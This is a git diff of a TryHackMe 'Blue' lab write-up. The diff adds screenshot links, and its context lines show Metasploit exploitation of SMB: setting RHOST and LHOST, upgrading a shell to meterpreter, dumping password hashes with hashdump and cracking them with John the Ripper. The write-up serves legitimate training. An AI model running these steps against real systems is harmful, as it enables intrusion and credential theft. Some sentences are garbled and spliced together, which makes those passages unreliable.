@@ -30,7 +30,7 @@ Explanation of Flags:
 -T5: Increases scan speed.
 
 Scan Results Summary:
-{image}
+[alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20114952%20-%20Copy.png)
 
 Observations:
 * SMB ports (139/445) are open, making it a primary target.
@@ -74,8 +74,7 @@ set RHOST 10.10.56.99
 Set LHOST 10.8.196.205
 exploit
 ```
-{image}
-
+[alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20121655.png)
 # Task 3 (Privlage Escalation)
 By using one of the post exploitation modules, we will upgrade our shell to meterpreter shell
 
@@ -86,15 +85,16 @@ search shell_to_meterpreter
 we can see list of modules, there we find only one module, shown below
 
 post/multi/manage/shell_to_meterpreter
- {image}
- As giHere we need to set the “SESSION” also the LHOST
+[alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20123638.png)
+[alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20123703.png)
+As giHere we need to set the “SESSION” also the LHOST
 
 After setting all these, we will Exploit to get the meterpreter shellven below to interact with the module we will be using “use 0” and then show options, what options we will be required to change ?
- {image}
+[alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20140530.png)
 # task 4 cracking
 As said to run the command “hashdump” these command had dumped three user names along with the encrypted passwords, we need to crack the encrypted password and find out the answer.
- {image}
+[alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202025-09-09%20140530.png)
  I cracked the password with the help from john the ripper 
- {image}
+[alt text](https://github.com/L33-a/TryHackMe-Writeups/blob/main/writeups/Blue/Screenshot%202024-02-22%20181804.png)
  #task 5 (flag)
  we have have full access to the computer we can access the flags
